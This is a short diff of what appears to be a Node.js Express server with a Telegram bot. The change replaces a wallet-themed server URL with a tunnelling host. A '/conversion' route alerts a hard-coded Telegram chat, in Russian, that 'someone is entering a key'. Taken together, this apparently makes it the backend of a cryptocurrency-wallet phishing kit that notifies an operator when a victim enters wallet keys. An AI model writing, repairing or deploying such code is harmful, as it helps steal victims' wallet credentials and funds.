@@ -15,7 +15,7 @@ const id = 7812265370;
 app.use((0, cors_1.default)());
 app.use(express_1.default.static(path_1.default.resolve(__dirname, '..', 'public')));
 console.log(path_1.default.resolve(__dirname, '..', 'public'));
-const serverUrl = 'https://wallet.barrons.space/';
+const serverUrl = 'https://q8i7iq-31-220-44-121.ru.tuna.am/';
 try {
     app.get('/conversion', (req, res) => {
         bot.sendMessage(id, `🤓🦣 Кто-то вводит ключ `, {
